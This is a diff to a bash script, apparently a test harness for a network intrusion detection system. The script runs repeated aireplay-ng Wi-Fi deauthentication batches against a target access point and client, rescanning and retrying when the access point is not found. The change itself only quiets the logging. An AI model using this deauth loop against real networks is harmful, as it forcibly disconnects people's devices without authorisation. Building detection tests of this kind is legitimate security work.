@@ -95,13 +95,25 @@ LABEL_SENT=1
 sleep 0.5
 
 run_aireplay_batch() {
-  # Print aireplay output; return 99 if "No such BSSID", else aireplay rc.
+  # Capture aireplay; return 99 if "No such BSSID", else aireplay rc.
+  # Default: quiet (one summary line). NIDS_VERBOSE=1 prints full aireplay spam.
   local out rc=0
   set +e
   out="$(aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE" 2>&1)"
   rc=$?
   set -e
-  printf '%s\n' "$out"
+  if [[ "${NIDS_VERBOSE:-0}" == "1" ]]; then
+    printf '%s\n' "$out"
+  else
+    if printf '%s\n' "$out" | grep -qi 'No such BSSID'; then
+      echo ">>> aireplay: No such BSSID"
+    elif printf '%s\n' "$out" | grep -qi 'Sending'; then
+      echo ">>> aireplay: sent deauth OK (rc=${rc})"
+    else
+      # keep last non-empty line for clues without flooding the terminal
+      echo ">>> aireplay: rc=${rc} ($(printf '%s\n' "$out" | grep -v '^$' | tail -n1))"
+    fi
+  fi
   if printf '%s\n' "$out" | grep -qi 'No such BSSID'; then
     return 99
   fi
@@ -118,10 +130,9 @@ for ((i=1; i<=repeats; i++)); do
   fi
 
   set +e
-  batch_out="$(run_aireplay_batch)"
+  run_aireplay_batch
   batch_rc=$?
   set -e
-  printf '%s\n' "$batch_out"
 
   if [[ "$batch_rc" -eq 99 && "$rescanned" -eq 0 && "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
     echo ">>> aireplay: No such BSSID — auto airodump refresh + retry batch" >&2
@@ -134,10 +145,9 @@ for ((i=1; i<=repeats; i++)); do
       apply_channel "$CHANNEL"
       rescanned=1
       set +e
-      batch_out="$(run_aireplay_batch)"
+      run_aireplay_batch
       batch_rc=$?
       set -e
-      printf '%s\n' "$batch_out"
     fi
   fi
 
